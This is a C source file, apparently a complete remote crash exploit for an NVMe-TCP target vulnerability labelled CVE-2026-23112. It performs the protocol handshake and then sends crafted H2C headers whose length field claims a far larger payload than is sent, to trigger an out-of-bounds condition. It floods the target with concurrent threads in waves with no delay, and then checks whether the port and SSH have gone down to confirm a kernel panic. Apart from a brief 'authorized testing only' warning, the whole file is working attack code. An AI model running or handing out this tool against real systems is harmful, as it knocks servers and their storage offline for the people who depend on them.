/*
 * CVE-2026-23112 -- NVMe-TCP Remote Kernel Panic Trigger (C)
 *
 * High-performance multi-threaded trigger for maximum crash throughput.
 * Uses non-blocking I/O and pthreads to saturate the target with
 * concurrent OOB-triggering connections.
 *
 * Compile:
 *   gcc -O2 -Wall -pthread -o nvmet_tcp_crash nvmet_tcp_crash.c
 *
 * Usage:
 *   ./nvmet_tcp_crash TARGET_IP [PORT] [THREADS] [WAVES]
 *
 * WARNING: For authorized security testing ONLY.
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

/* NVMe-TCP PDU types */
#define NVME_TCP_ICREQ   0x00
#define NVME_TCP_ICRESP  0x01
#define NVME_TCP_H2C     0x06
#define NVME_TCP_CMD     0x04
#define ICREQ_HLEN       128

/* Defaults */
#define DEFAULT_PORT     4420
#define DEFAULT_THREADS  16
#define DEFAULT_WAVES    20
#define CONNECT_TIMEOUT  3   /* seconds */

struct crash_args {
    const char *target;
    int port;
    int thread_id;
    int wave;
    int payload_claim;
};

static volatile int g_total_sent = 0;
static volatile int g_total_fail = 0;
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

static void build_icreq(unsigned char *buf)
{
    memset(buf, 0, ICREQ_HLEN);
    buf[0] = NVME_TCP_ICREQ;
    buf[2] = ICREQ_HLEN;
    /* plen = ICREQ_HLEN (little-endian at offset 4) */
    buf[4] = ICREQ_HLEN;
}

static void build_h2c_oob(unsigned char *buf, int hlen, int payload_claim)
{
    memset(buf, 0, hlen);
    buf[0] = NVME_TCP_H2C;
    buf[2] = (unsigned char)hlen;
    /* plen = hlen + payload_claim (little-endian at offset 4) */
    int plen = hlen + payload_claim;
    memcpy(&buf[4], &plen, 4);  /* assumes little-endian host */
}

static int connect_timeout(const char *ip, int port, int timeout_sec)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct timeval tv = { .tv_sec = timeout_sec, .tv_usec = 0 };
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        close(fd);
        return -1;
    }

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    return fd;
}

static void *crash_thread(void *arg)
{
    struct crash_args *a = (struct crash_args *)arg;
    unsigned char icreq[ICREQ_HLEN];
    unsigned char resp[ICREQ_HLEN];
    unsigned char h2c[64];
    int ok = 0;

    int fd = connect_timeout(a->target, a->port, CONNECT_TIMEOUT);
    if (fd < 0)
        goto out;

    /* ICReq */
    build_icreq(icreq);
    if (send(fd, icreq, ICREQ_HLEN, 0) != ICREQ_HLEN)
        goto out_close;

    /* ICResp */
    int n = recv(fd, resp, ICREQ_HLEN, 0);
    if (n < 8 || resp[0] != NVME_TCP_ICRESP)
        goto out_close;

    /* OOB trigger */
    int hlen = 24;
    build_h2c_oob(h2c, hlen, a->payload_claim);
    if (send(fd, h2c, hlen, 0) == hlen)
        ok = 1;

    /* Brief pause to let the kernel process before we close */
    usleep(50000);

out_close:
    close(fd);
out:
    pthread_mutex_lock(&g_lock);
    if (ok)
        g_total_sent++;
    else
        g_total_fail++;
    pthread_mutex_unlock(&g_lock);

    free(a);
    return NULL;
}

static int check_alive(const char *target, int port)
{
    int fd = connect_timeout(target, port, 2);
    if (fd < 0) return 0;
    close(fd);
    return 1;
}

int main(int argc, char **argv)
{
    const char *target = argc > 1 ? argv[1] : NULL;
    int port    = argc > 2 ? atoi(argv[2]) : DEFAULT_PORT;
    int threads = argc > 3 ? atoi(argv[3]) : DEFAULT_THREADS;
    int waves   = argc > 4 ? atoi(argv[4]) : DEFAULT_WAVES;

    if (!target) {
        fprintf(stderr, "Usage: %s TARGET_IP [PORT] [THREADS] [WAVES]\n",
                argv[0]);
        fprintf(stderr, "\n");
        fprintf(stderr, "  TARGET_IP   IP address of NVMe-TCP target\n");
        fprintf(stderr, "  PORT        NVMe-TCP port (default: %d)\n",
                DEFAULT_PORT);
        fprintf(stderr, "  THREADS     Parallel connections per wave "
                "(default: %d)\n", DEFAULT_THREADS);
        fprintf(stderr, "  WAVES       Number of crash waves "
                "(default: %d)\n", DEFAULT_WAVES);
        fprintf(stderr, "\n");
        fprintf(stderr, "WARNING: For authorized security testing ONLY.\n");
        return 1;
    }

    printf("[*] CVE-2026-23112 NVMe-TCP Remote Crash (C)\n");
    printf("[*] Target: %s:%d | Threads: %d | Waves: %d\n",
           target, port, threads, waves);

    if (!check_alive(target, port)) {
        fprintf(stderr, "[!] Cannot connect to %s:%d\n", target, port);
        return 1;
    }
    printf("[+] Target is listening\n\n");

    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);

    int target_down = 0;

    for (int w = 0; w < waves && !target_down; w++) {
        pthread_t *tids = calloc(threads, sizeof(pthread_t));
        int wave_sent = g_total_sent;

        for (int t = 0; t < threads; t++) {
            struct crash_args *a = malloc(sizeof(*a));
            a->target = target;
            a->port = port;
            a->thread_id = t;
            a->wave = w;
            /* Vary payload claim per thread: different OOB distances */
            a->payload_claim = 65536 + t * 4096;

            if (pthread_create(&tids[t], NULL, crash_thread, a) != 0) {
                free(a);
                tids[t] = 0;
            }
        }

        for (int t = 0; t < threads; t++) {
            if (tids[t])
                pthread_join(tids[t], NULL);
        }

        int wave_ok = g_total_sent - wave_sent;

        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        double elapsed = (now.tv_sec - t0.tv_sec) +
                         (now.tv_nsec - t0.tv_nsec) / 1e9;

        printf("  Wave %3d/%d: sent=%2d  [%.1fs elapsed]\n",
               w + 1, waves, wave_ok, elapsed);

        if (wave_ok == 0) {
            printf("\n[+] All connections refused -- target port DOWN\n");
            target_down = 1;
        }

        free(tids);

        if (!target_down && w < waves - 1)
            usleep(0);  /* No delay between waves */
    }

    printf("\n[*] Total triggers sent: %d  (failed: %d)\n",
           g_total_sent, g_total_fail);

    sleep(2);
    if (check_alive(target, port)) {
        printf("[*] Target port %d still UP\n", port);
    } else {
        printf("[+] Target port %d DOWN\n", port);
        if (!check_alive(target, 22)) {
            printf("[+] SSH also DOWN -- KERNEL PANIC LIKELY\n");
        } else {
            printf("[*] SSH still up -- service crash only\n");
        }
    }

    return 0;
}
